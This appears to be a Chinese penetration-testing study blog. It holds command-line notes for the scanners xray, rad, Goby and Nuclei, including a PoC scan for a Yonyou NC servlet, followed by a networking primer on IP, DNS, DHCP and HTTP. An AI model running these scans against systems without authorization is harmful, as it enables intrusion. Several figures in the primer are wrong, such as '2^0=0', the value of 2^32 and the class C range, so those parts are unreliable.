<h3 id="如果和bp一起就要到settings-gt-Network-gt-Connections-gt-Upstream-Proxy-Servers-gt-Add；操作如图"><a href="#如果和bp一起就要到settings-gt-Network-gt-Connections-gt-Upstream-Proxy-Servers-gt-Add；操作如图" class="headerlink" title="如果和bp一起就要到settings-&gt;Network-&gt;Connections-&gt;Upstream Proxy Servers-&gt;Add；操作如图"></a>如果和bp一起就要到settings-&gt;Network-&gt;Connections-&gt;Upstream Proxy Servers-&gt;Add；操作如图</h3><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240605202841547.png" alt="image-20240605202841547"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray.exe ws --listen 127.0.0.1:7777 --ho test.html</span><br></pre></td></tr></table></figure>
<h2 id="rad联动xray："><a href="#rad联动xray：" class="headerlink" title="rad联动xray："></a>rad联动xray：</h2><p>爬虫工具配合xray；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray.exe ws --listen 127.0.0.1:7777 --ho proxy.html</span><br><span class="line"></span><br><span class="line">rad -t http://testphp.vulnweb.com/ --http-proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure>
<p>高级版xray</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">xray</span> <span class="string">ws</span> <span class="string">--browser-crawler</span> <span class="string">http://testphp.vulnweb.com/</span> <span class="string">--ho</span> <span class="string">vuln.html</span></span><br></pre></td></tr></table></figure>
<p>poc检测；编写可以去找官方文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray ws -p mypocs/poc-yaml-用友NC-bsh.servlet.BshServlet.yml -uf url.txt --ho yongyou-nc.html</span><br></pre></td></tr></table></figure>
<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>网络测试安全工具，Zwell打造</p>
<p>使用and扫描：</p>
<p>可以联动xray：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要将配置文件复制到goby目录</span><br></pre></td></tr></table></figure>
<h2 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h2><p>基于YAML的DSL的快速且可定制的漏洞扫描器；基于模版跨目标发送请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/yijingsec/nuclei/releases</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">更新漏洞模版</span><br><span class="line">nuclei -update-templates</span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">基本指令</span></span><br><span class="line"><span class="comment"># nuclei -h</span></span><br><span class="line"></span><br><span class="line"><span class="string">用法：</span></span><br><span class="line">  <span class="string">nuclei</span> [<span class="string">命令</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">命令：</span></span><br><span class="line"><span class="string">目标：</span></span><br><span class="line">   <span class="string">-u,</span> <span class="string">-target</span> <span class="string">string[]</span>                 <span class="string">指定扫描的URL/主机</span></span><br><span class="line">   <span class="string">-l,</span> <span class="string">-list</span> <span class="string">string</span>                     <span class="string">指定需要扫描的URL/主机文件（一行一个）</span></span><br><span class="line"></span><br><span class="line"><span class="string">模板：</span></span><br><span class="line">   <span class="string">-t,</span> <span class="string">-templates</span> <span class="string">string[]</span>              <span class="string">指定需要扫描的模板或者模板的路径</span></span><br><span class="line">   <span class="string">-nt,</span> <span class="string">-new-templates</span>                  <span class="string">只扫描最新版本中添加的模板</span></span><br><span class="line">   <span class="string">-w,</span> <span class="string">-workflows</span> <span class="string">string[]</span>              <span class="string">指定扫描中的工作流或者工作流目录</span></span><br><span class="line">   <span class="string">-validate</span>                            <span class="string">验证通过的模板</span></span><br><span class="line">   <span class="string">-tl</span>                                  <span class="string">列出所有可用的模板</span></span><br><span class="line"></span><br><span class="line"><span class="string">过滤：</span></span><br><span class="line">   <span class="string">-tags</span> <span class="string">string[]</span>                       <span class="string">执行有标记的模板子集</span></span><br><span class="line">   <span class="string">-etags,</span> <span class="string">-exclude-tags</span> <span class="string">string[]</span>       <span class="string">执行标记为排除的模板</span></span><br><span class="line">   <span class="string">-itags,</span> <span class="string">-include-tags</span> <span class="string">string[]</span>       <span class="string">不执行具有攻击性的模板</span></span><br><span class="line">   <span class="string">-et,</span> <span class="string">-exclude-templates</span> <span class="string">string[]</span>     <span class="string">要排除的模板或者模板目录</span></span><br><span class="line">   <span class="string">-it,</span> <span class="string">-include-templates</span> <span class="string">string[]</span>     <span class="string">执行默认或配置中排除的模板</span></span><br><span class="line">   <span class="string">-s,</span> <span class="string">-severity</span> <span class="string">value[]</span>                <span class="string">根据严重程度运行模板，可候选的值有：info,low,medium,high,critical</span>   </span><br><span class="line">   <span class="string">-es,</span> <span class="string">-exclude-severity</span> <span class="string">value[]</span>       <span class="string">根据严重程度排除模板，可候选的值有：info,low,medium,high,critical</span>   </span><br><span class="line">   <span class="string">-a,</span> <span class="string">-author</span> <span class="string">string[]</span>                 <span class="string">执行指定作者的模板</span></span><br><span class="line"></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line">   <span class="string">-o,</span> <span class="string">-output</span> <span class="string">string</span>          </span><br><span class="line">   <span class="string">输出发现的问题到文件</span></span><br><span class="line">   <span class="string">-silent</span>                              <span class="string">只显示结果</span></span><br><span class="line">   <span class="string">-nc,</span> <span class="string">-no-color</span>                       <span class="string">禁用输出内容着色（ANSI转义码）</span></span><br><span class="line">   <span class="string">-json</span>                                <span class="string">输出为jsonL（ines）</span></span><br><span class="line">   <span class="string">-irr,</span> <span class="string">-include-rr</span>                    <span class="string">在JSONL中输出对应的请求和相应（仅结果）</span></span><br><span class="line">   <span class="string">-nm,</span> <span class="string">-no-meta</span>                        <span class="string">不显示匹配的元数据</span></span><br><span class="line">   <span class="string">-nts,</span> <span class="string">-no-timestamp</span>                  <span class="string">不在输出中显示时间戳</span></span><br><span class="line">   <span class="string">-rdb,</span> <span class="string">-report-db</span> <span class="string">string</span>              <span class="string">本地的Nuclei结果数据库（始终使用该数据库保存结果）</span>       </span><br><span class="line">   <span class="string">-me,</span> <span class="string">-markdown-export</span> <span class="string">string</span>         <span class="string">以markdown导出结果</span></span><br><span class="line">   <span class="string">-se,</span> <span class="string">-sarif-export</span> <span class="string">string</span>            <span class="string">以SARIF导出结果</span></span><br><span class="line"></span><br><span class="line"><span class="string">配置：</span></span><br><span class="line">   <span class="string">-config</span> <span class="string">string</span>                       <span class="string">指定Nuclei的配置文件</span></span><br><span class="line">   <span class="string">-rc,</span> <span class="string">-report-config</span> <span class="string">string</span>           <span class="string">指定Nuclei报告模板文件</span></span><br><span class="line">   <span class="string">-H,</span> <span class="string">-header</span> <span class="string">string[]</span>                 <span class="string">指定报告中的标题：value格式</span></span><br><span class="line">   <span class="string">-V,</span> <span class="string">-var</span> <span class="string">value</span>                       <span class="string">通过var=value指定var值</span></span><br><span class="line">   <span class="string">-r,</span> <span class="string">-resolvers</span> <span class="string">string</span>                <span class="string">指定Nuclei的解析文件</span></span><br><span class="line">   <span class="string">-sr,</span> <span class="string">-system-resolvers</span>               <span class="string">当DNS错误时使用系统DNS</span></span><br><span class="line">   <span class="string">-passive</span>                             <span class="string">启用被动扫描处理HTTP响应</span></span><br><span class="line">   <span class="string">-ev,</span> <span class="string">env-vars</span>                        <span class="string">在模板中使用环境变量</span></span><br><span class="line"></span><br><span class="line"><span class="string">交互：</span></span><br><span class="line">   <span class="string">-inserver,</span> <span class="string">-ineractsh-server</span> <span class="string">string</span>  <span class="string">使用interactsh反连检测平台（默认为&quot;https://interact.sh&quot;）</span></span><br><span class="line">   <span class="string">-itoken,</span> <span class="string">-interactsh-token</span> <span class="string">string</span>    <span class="string">指定反连检测平台的身份凭证</span></span><br><span class="line">   <span class="string">-interactions-cache-size</span> <span class="string">int</span>         <span class="string">指定保存在交互缓存中的请求数（默认：5000）</span></span><br><span class="line">   <span class="string">-interactions-eviction</span> <span class="string">int</span>           <span class="string">从缓存中删除请求前等待的时间（默认为60秒）</span></span><br><span class="line">   <span class="string">-interactions-poll-duration</span> <span class="string">int</span>      <span class="string">每个轮询前等待时间（默认为5秒）</span></span><br><span class="line">   <span class="string">-interactions-cooldown-period</span> <span class="string">int</span>    <span class="string">退出轮询前的等待时间（默认为5秒）</span></span><br><span class="line">   <span class="string">-ni,</span> <span class="string">-no-interactsh</span>                  <span class="string">禁用反连检测平台，同时排除基于反连检测的模板</span></span><br><span class="line"></span><br><span class="line"><span class="string">限速：</span></span><br><span class="line">   <span class="string">-r1,</span> <span class="string">-rate-limit</span> <span class="string">int</span>                 <span class="string">每秒最大请求量（默认：150）</span></span><br><span class="line">   <span class="string">-rlm,</span> <span class="string">-rate-limit-minute</span> <span class="string">int</span>         <span class="string">每分钟最大请求量</span></span><br><span class="line">   <span class="string">-bs,</span> <span class="string">-bulk-size</span> <span class="string">int</span>                  <span class="string">每个模板最大并行检测数（默认：25）</span></span><br><span class="line">   <span class="string">-c,</span> <span class="string">-concurrency</span> <span class="string">int</span>                 <span class="string">并行执行的最大模板数量（默认：25）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">优化：</span></span><br><span class="line">   <span class="string">-timeout</span> <span class="string">int</span>                         <span class="string">超时时间（默认为5秒）</span></span><br><span class="line">   <span class="string">-retries</span> <span class="string">int</span>                         <span class="string">重试次数（默认：1）</span></span><br><span class="line">   <span class="string">-mhe,</span> <span class="string">-max-host-error</span> <span class="string">int</span>            <span class="string">某主机扫描失败次数，跳过该主机（默认：30）</span></span><br><span class="line">   <span class="string">-project</span>                             <span class="string">使用项目文件夹避免多次发送同一请求</span></span><br><span class="line">   <span class="string">-project-path</span> <span class="string">string</span>                 <span class="string">设置特定的项目文件夹</span></span><br><span class="line">   <span class="string">-spm,</span> <span class="string">-stop-at-first-path</span>            <span class="string">得到一个结果后停止（或许会中断模板和工作流的逻辑）</span></span><br><span class="line">   <span class="string">-stream</span>                              <span class="string">流模式</span> <span class="bullet">-</span> <span class="string">在不整理输入的情况下详细描述</span></span><br><span class="line"></span><br><span class="line"><span class="string">无界面浏览器：</span></span><br><span class="line">    <span class="string">-headless</span>                           <span class="string">启用需要无界面浏览器的模板</span></span><br><span class="line">    <span class="string">-page-timeout</span> <span class="string">int</span>                   <span class="string">在无界面下超时秒数（默认：20）</span></span><br><span class="line">    <span class="string">-sb,</span> <span class="string">-show-brower</span>                   <span class="string">在无界面浏览器运行模板时，显示浏览器</span></span><br><span class="line">    <span class="string">-sc,</span> <span class="string">-system-chrome</span>                 <span class="string">不使用Nuclei自带的浏览器，使用本地浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="string">调试：</span></span><br><span class="line">    <span class="string">-debug</span>                              <span class="string">显示所有请求和响应</span></span><br><span class="line">    <span class="string">-debug-req</span>                          <span class="string">显示所有请求</span></span><br><span class="line">    <span class="string">-debug-resp</span>                         <span class="string">显示所有响应</span></span><br><span class="line">    <span class="string">-proxy,</span> <span class="string">-proxy-url</span> <span class="string">string</span>           <span class="string">使用HTTP代理</span></span><br><span class="line">    <span class="string">-proxy-socks-url</span> <span class="string">string</span>             <span class="string">使用SOCK5代理</span></span><br><span class="line">    <span class="string">-tlog,</span> <span class="string">-trace-log</span> <span class="string">string</span>            <span class="string">写入请求日志到文件</span></span><br><span class="line">    <span class="string">-version</span>                            <span class="string">显示版本信息</span></span><br><span class="line">    <span class="string">-v,</span> <span class="string">-verbose</span>                        <span class="string">显示详细信息</span></span><br><span class="line">    <span class="string">-vv</span>                                 <span class="string">显示额外的详细信息</span></span><br><span class="line">    <span class="string">-tv,</span> <span class="string">-templates-version</span>             <span class="string">显示已安装的模板版本</span></span><br><span class="line"></span><br><span class="line"><span class="string">升级：</span></span><br><span class="line">    <span class="string">-update</span>                             <span class="string">更新Nuclei到最新版本</span></span><br><span class="line">    <span class="string">-ut,</span> <span class="string">-update-templates</span>              <span class="string">更新Nuclei模板到最新版</span></span><br><span class="line">    <span class="string">-ud,</span> <span class="string">-update-directory</span> <span class="string">string</span>       <span class="string">覆盖安装模板</span></span><br><span class="line">    <span class="string">-duc,</span> <span class="string">-disable-update-check</span>         <span class="string">禁用更新</span></span><br><span class="line"></span><br><span class="line"><span class="string">统计：</span></span><br><span class="line">    <span class="string">-stats</span>                              <span class="string">显示正在扫描的统计信息</span></span><br><span class="line">    <span class="string">-sj,</span> <span class="string">-stats-json</span>                    <span class="string">将统计信息以JSONL格式输出到文件</span></span><br><span class="line">    <span class="string">-si,</span> <span class="string">-stats-inerval</span> <span class="string">int</span>             <span class="string">显示统计信息更新的间隔秒数（默认：5）</span></span><br><span class="line">    <span class="string">-m,</span> <span class="string">-metrics</span>                        <span class="string">显示Nuclei端口信息</span></span><br><span class="line">    <span class="string">-mp,</span> <span class="string">-metrics-port</span> <span class="string">int</span>              <span class="string">更改Nuclei默认端口（默认：9092）</span></span><br></pre></td></tr></table></figure>
<h2 id="扫描常见参数"><a href="#扫描常见参数" class="headerlink" title="扫描常见参数"></a>扫描常见参数</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">扫描单个目标</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-u</span> <span class="string">&lt;url&gt;</span></span><br><span class="line"><span class="string">扫描多个目标</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-l</span> <span class="string">&lt;list.txt&gt;</span></span><br><span class="line"><span class="string">指定模版</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-u</span> <span class="string">&lt;url&gt;</span> <span class="string">-t</span> <span class="string">&lt;poc.yaml/poc_dir&gt;</span></span><br><span class="line"><span class="string">扫描结果输出</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-u</span> <span class="string">&lt;url&gt;</span> <span class="string">-o</span> <span class="string">&lt;results.txt&gt;</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-u</span> <span class="string">&lt;url&gt;</span> <span class="string">-o</span> <span class="string">&lt;results.json&gt;</span> <span class="string">-json</span> <span class="string">-irr</span></span><br><span class="line"><span class="string">调试模版</span></span><br><span class="line"><span class="string">nuclei</span> <span class="string">-u</span> <span class="string">&lt;url&gt;</span> <span class="string">-debug</span> <span class="string">-t</span> <span class="string">&lt;poc.yaml&gt;</span></span><br></pre></td></tr></table></figure>
<p>模版编写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nuclei.projectdiscovery.io/templating-guide/</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>扫描</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透日记之计算机网络</title>
    <url>/posts/53248527.html</url>
    <content><![CDATA[<p>常见私有IP段：10.0.0.0 ~10.255.255.255</p>
<p>00001010.00000000.00000000.00000000~000001010.11111111.11111111.11111111</p>
<p>​            172.16.0.0~172.31.255.255</p>
<p>11000000.00010000.00000000.00000000~11000000.00100000.11111111.11111111</p>
<p>​            192.168.0.0~192.168.255.255</p>
<p>11000000.10101000.00000000.00000000~11000000.101010000.11111111.11111111</p>
<script type="math/tex; mode=display">
2^0=0\;\;\;\;2^1=2\;\;\;\;2^2=4\;\;\;\;2^3=8\;\;\;\;2^4=16\;\;\;\;2^5=32\;\;\;\;2^6=64\;\;\;\;2^7=128</script><h1 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>提供应用功能；包含c/s p2p模型；</p>
<p>常见的有http，smtp（TCP协议 25端口），ftp（文件传输协议 21）dns协议</p>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>有两个传输协议：</p>
<ol>
<li>TCP：大部分应用使用的是TCP传输层协议，有流量控制、超时重传、拥塞控制。保证数据包可靠的传输给对方。</li>
<li>UDP：相对简单，只负责发生数据包，不保证数据包是否抵达对方，实时性更好，传输效率也高。在应用层实现TCP的特性也可以实现可靠传输。</li>
</ol>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>TCP/IP协议：寻址，路由。</p>
<p>ip地址：网络号（标识ip地址是哪一个子网的），主机号（标识同一个子网的不同主机）</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>网卡-&gt;MAC；(ARP协议)</p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>二进制信息传输；数据包转为电信号，让其可以在物理介质中传输。这一层就是物理层。</p>
<h1 id="图解IP"><a href="#图解IP" class="headerlink" title="图解IP"></a>图解IP</h1><p>网关：默认寻找IP。</p>
<p>路由表：寻找目标；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>
<p>IP和MAC的关系：MAC实现直连的两个设备之间通信，IP则负责在没有直连的两个网络之间进行通信传输；</p>
<p>源MAC地址和目标MAC地址一直在变化。源ip和目的ip不会变化。</p>
<p>2^32=4294967269</p>
<p>A类地址：0    0.0.0.0 ~127.255.255.255 1677w7214 2^24^-1</p>
<p>B类地址：10    128.0.0.0 ~191.255.255.255    6w5534 2^16^-1</p>
<p>C类地址：110    129.0.0.0~223.255.255.255    254 2^8^-1</p>
<p>d类地址：1110    224.0.0.0~239.255.255.255    组播地址：用于多播:多播用于<strong>将包发送给特定组内的所有主机</strong></p>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>224.0.0.0 ~ 224.0.0.255 为预留的组播地址，只能局域网中，路由器是不会进行转发的</li>
<li>224.0.1.0 ~ 238.255.255.255  为用户可用的组播地址，可以用于 Internet 上</li>
<li>239.0.0.0 ~ 239.255.255.255 为本地管理组播地址，可供内部网在内部使用，仅在特定的本地范围内有效</li>
</ul>
</blockquote>
<p>e类地址：11110    240.0.0.0~255.255.255    留待用处</p>
<p>CIDR:无分类地址。前面是网络号，后面是主机号 加上/x</p>
<p><strong>子网掩码与IP地址按位计算&amp;，可得到网络号</strong></p>
<p>子网掩码还有一个作用，那就是<strong>划分子网</strong>。</p>
<p><strong>子网划分实际上是将主机地址分为两个部分：子网网络地址和子网主机地址</strong></p>
<p>napt协议：ip地址加上端口。</p>
<blockquote>
<p>[!TIP]</p>
<p>私有 IP 地址通常是内部的 IT 人员值管理，公有 IP 地址是由 <code>ICANN</code> 组织管理，中文叫「互联网名称与数字地址分配机构」。</p>
</blockquote>
<p>主机号全0为网络地址，全1为广播地址（用于同一链路相互连接的主机之间发送数据包）本地广播会被接受，不同网络的直接广播默认不会设置转发。</p>
<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><h3 id="DNS协议：域名解析协议；将网站自动转为ip"><a href="#DNS协议：域名解析协议；将网站自动转为ip" class="headerlink" title="DNS协议：域名解析协议；将网站自动转为ip"></a>DNS协议：域名解析协议；将网站自动转为ip</h3><p>域名存在三个层级：根dns服务器（保存在所有互联网的dns服务器中)；顶级域dns服务器（com，cn）；权威dns服务器</p>
<p>为了方便记忆而诞生的域名解析协议：过程如下。</p>
<ol>
<li>查看DNS缓存 浏览器缓存-&gt;操作系统缓存-&gt;host缓存；     没有转2</li>
<li>发出DNS请求，询问冰发给本地DNS服务器</li>
<li>本地DNS服务器查找缓存                       没有转3</li>
<li>寻找根域名服务器-&gt;给与顶级域名服务器地址</li>
<li>本地dns询问顶级域名服务器</li>
<li>本地询问询问权威DNS服务器</li>
<li>权威dns服务器将对应的ip地址告诉本地</li>
<li>本地dns返回ip地址给客户端，建立连接</li>
</ol>
<h3 id="ARP与RARP协议："><a href="#ARP与RARP协议：" class="headerlink" title="ARP与RARP协议："></a>ARP与RARP协议：</h3><p>解析IP所在的MAC地址；主机通过广播发送ARP请求，包含想要知道的MAC地址的主机IP地址。同一链路的所有设备收到ARP请求时，如果拆开ARP请求包中的内容，目标IP和自己的IP一致，该设备就将自己的MAC地址塞入ARP响应包返回给主机。操作系统会缓存ARP获得的MAC地址；超过一定期限，，缓存内容被清除</p>
<p>解析MAC地址的IP（需要架设以太RAPR服务器，在该服务器上注册设备的MAC地址和IP地址，设备会发送自己的MAC地址，RARP收到该消息会返回MAC地址为xxx的IP地址为xxx）；</p>
<h3 id="DHCP协议："><a href="#DHCP协议：" class="headerlink" title="DHCP协议："></a>DHCP协议：</h3><p>动态获取IP协议；</p>
<ol>
<li><p>客户端发起 ==DHCP发现报文（DHCP DISCOVER)== 的 IP数据包,没有ip地址，不知道dhcp服务器的地址，使用UDP广播通信，目的地址255.255.255.255（端口：67）使用0.0.0.0（68端口）作为源IP地址；dhcp客户端将该IP数据传给链路层，然后将帧广播到所有网络设备中。</p>
</li>
<li><p>dhcp服务器收到 DHCP 发现报文后，用==DHCP提供报文（DHCP OFFER）==向客户端做出响应。任然使用IP广播地址255.255.255.255，该报文信息携带服务器可租约的IP地址，子网掩码，默认网关，dns服务器以及ip地址租用期。</p>
</li>
<li><p>客户收到一个或多个服务器的DHCP提供报文后，选择一个服务器，发送==FHCP请求报文(DHCP REQUEST)==进行响应，回显配置的参数</p>
</li>
<li><p>服务端最后用==DHCP ACK报文==对DHCP请求报文进行响应。</p>
<p>全程使用udp广播通信。不在同一个局域网的话，DHCP中继代理，对不同网段的IP地址分配可以由一个DHCP服务器进行统一管理。</p>
</li>
</ol>
<h3 id="NAT："><a href="#NAT：" class="headerlink" title="NAT："></a>NAT：</h3><p>网络地址转换协议；进阶NAPT；ip地址+端口号；可以将私有地址转为公有地址，以不同的端口号进行区分。</p>
<h3 id="ICMP协议："><a href="#ICMP协议：" class="headerlink" title="ICMP协议："></a>ICMP协议：</h3><p>互联网控制报文。</p>
<p>主要功能：确认IP是否成功送达目标地址，报告发送过程中被废弃的原因和改善网络设置等等。</p>
<p>1.查询报文类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0	回送应答</span><br><span class="line">8	回送请求</span><br></pre></td></tr></table></figure>
<p>2.差错报文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3	目标不可达</span><br><span class="line">4	源点抑制</span><br><span class="line">5	重定向或改变路由</span><br><span class="line">11	超时</span><br></pre></td></tr></table></figure>
<h1 id="HTTP介绍："><a href="#HTTP介绍：" class="headerlink" title="HTTP介绍："></a>HTTP介绍：</h1><p>http是超文本传输协议；Hypertext  TransferProtocol</p>
<p>分为三个部分：超文本；传输；协议；</p>
<h2 id="协议："><a href="#协议：" class="headerlink" title="协议："></a>协议：</h2><p>http是一个用在计算机世界里的协议。它使用计算机能够理解的语言确立了一种计算机之间交流的规范，以及相关的各种控制和错误处理方式。</p>
<h2 id="传输："><a href="#传输：" class="headerlink" title="传输："></a>传输：</h2><p>数据利用http协议进行传输，由浏览器进行渲染，就可以看见图片，视频。</p>
<h2 id="超文本："><a href="#超文本：" class="headerlink" title="超文本："></a>超文本：</h2><p>http传输的内容就是超文本。</p>
<p><strong>总结：HTTP是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</strong></p>
<h2 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h2><p>统一资源定位符；具有标准的语法；其中https端口会默认省略是443；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protocol://[[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line"></span><br><span class="line">[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段ID]</span><br><span class="line">protocol：指定使用的传输协议，最常用的是通过 HTTP/HTTPS 协议来定位网络资源。</span><br><span class="line">          mailto: 用户打开邮箱的客户端</span><br><span class="line">          ftp: 用来做文件的转换</span><br><span class="line">          file: 用来获取文件</span><br><span class="line">user:password 需要认证后才能访问时的账号密码。</span><br><span class="line">host：表示合法的因特网主机域名或者IP地址。</span><br><span class="line">port：用于表示在传输层上交换信息的进程端口号，标明了获取服务器资源的入口,</span><br><span class="line">      http协议默认端口号为80，不同的协议默认端口号不同。</span><br><span class="line">path：指定请求服务器上资源的路径。</span><br><span class="line">?query：可选，用于给动态网页传递参数，可以有多个参数，用&quot;&amp;&quot;符号隔开，每个参数的键值之间用&quot;=&quot;隔开。</span><br><span class="line">#fragment：信息片断字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。</span><br><span class="line">例：</span><br><span class="line">https://en.wikipedia.org:443/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522133715771.png" alt="image-20240522133715771"></p>
<h2 id="URI："><a href="#URI：" class="headerlink" title="URI："></a>URI：</h2><p>统一资源标识符；用来标识抽象字符或物理资源的一个紧凑字符串。</p>
<p>http使用统一资源标识符URI 来传输数据和建立连接</p>
<p>同样差不多的是URN,统一资源名称，通过特定命名空间中的唯一名称或id来标识资源</p>
<h2 id="Request："><a href="#Request：" class="headerlink" title="Request："></a>Request：</h2><p>包含四个部分：请求行；请求头部；空行；请求正文；每部分使用\r\n（CRLF //回车符，换行符）分隔开</p>
<h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method Request-URI HTTP-Version CRLF</span><br><span class="line"></span><br><span class="line">Method：表示请求方法;</span><br><span class="line">Request-URI：是一个统一资源标识符;</span><br><span class="line">HTTP-Version：表示请求的HTTP协议版本;</span><br><span class="line">CRLF：表示回车和换行</span><br></pre></td></tr></table></figure>
<p>请求方法：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">请求获取Request-URI所标识的资源</span></span><br><span class="line"></span><br><span class="line"><span class="string">POST</span> <span class="string">在Request-URI所标识的资源后附加新的数据</span></span><br><span class="line"><span class="comment">#get post是最常见的请求；</span></span><br><span class="line"><span class="string">HEAD</span> <span class="string">请求获取由Request-URI所标识的资源的响应消息报头</span></span><br><span class="line"></span><br><span class="line"><span class="string">PUT</span> <span class="string">请求服务器存储一个资源，并用Request-URI作为其标识</span></span><br><span class="line"></span><br><span class="line"><span class="string">DELETE</span> <span class="string">请求服务器删除Request-URI所标识的资源</span></span><br><span class="line"><span class="comment">#put，delete只要存在就可能出问题；可能存在任意文件上传，删除</span></span><br><span class="line"><span class="string">TRACE</span> <span class="string">请求服务器回送收到的请求信息，主要用于测试或诊断</span></span><br><span class="line"></span><br><span class="line"><span class="string">OPTIONS</span> <span class="string">请求查询服务器的性能，或者查询与资源相关的选项和需求</span></span><br><span class="line"></span><br><span class="line"><span class="string">CONNECT</span> <span class="string">保留将来使用，HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</span></span><br><span class="line"></span><br><span class="line"><span class="string">PATCH</span> <span class="string">用于将局部修改应用到资源。（由</span> <span class="string">RFC</span> <span class="number">5789</span> <span class="string">指定的方法）</span></span><br></pre></td></tr></table></figure>
<h3 id="请求头部字段"><a href="#请求头部字段" class="headerlink" title="请求头部字段"></a>请求头部字段</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有的的</span></span><br><span class="line"><span class="string">https://tools.jb51.net/table/http_content_type</span></span><br><span class="line"><span class="string">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers</span></span><br></pre></td></tr></table></figure>
<p>常见字段：</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522134529886.png" alt="image-20240522134529886"></p>
<p>1）Host：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Host:</span> <span class="string">www.A.com</span></span><br><span class="line"><span class="string">指定服务器的域名</span></span><br><span class="line"><span class="comment">#host碰撞漏洞</span></span><br></pre></td></tr></table></figure>
<p>2）Content-Length</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Content-Length:&amp;nbsp;1000</span></span><br><span class="line"><span class="string">表明本次回应的数据长度</span></span><br><span class="line"><span class="comment">#不存在漏洞</span></span><br></pre></td></tr></table></figure>
<p>3）Connection</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Connection:&amp;nbsp;keep-alive</span></span><br><span class="line"><span class="string">常用于客户端要求服务器使用TCP持久连接，以便其它请求复用</span></span><br><span class="line"><span class="string">https默认持久连接，为了兼容老版本，需要指定首部为keep-Alive</span></span><br><span class="line"><span class="string">Connection:&amp;nbsp;keep-alive</span></span><br></pre></td></tr></table></figure>
<p>4）Content-Type</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">用于服务器回应时；告诉客户端，本次数据格式</span></span><br><span class="line"><span class="string">Content-Type:&amp;nbsp;text/html;&amp;nbsp;charset=utf-8</span></span><br><span class="line"><span class="string">客户端请求时；可以使用Accept声明接受那些数据格式</span></span><br><span class="line"><span class="string">Accept:&amp;nbsp;*/*</span></span><br></pre></td></tr></table></figure>
<p>5）Content-Encodeing</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">说明数据的压缩方法，表明服务器返回数据使用了什么压缩格式</span></span><br><span class="line"><span class="string">Content-Encoding:&amp;nbsp;gzip</span></span><br><span class="line"><span class="string">客户端请求时；可以使用Accept-Encoding声明接受那些数据格式</span></span><br><span class="line"><span class="string">Accept-Encoding:&amp;nbsp;gzip,&amp;nbsp;deflate</span></span><br></pre></td></tr></table></figure>
<p>6)Origin</p>
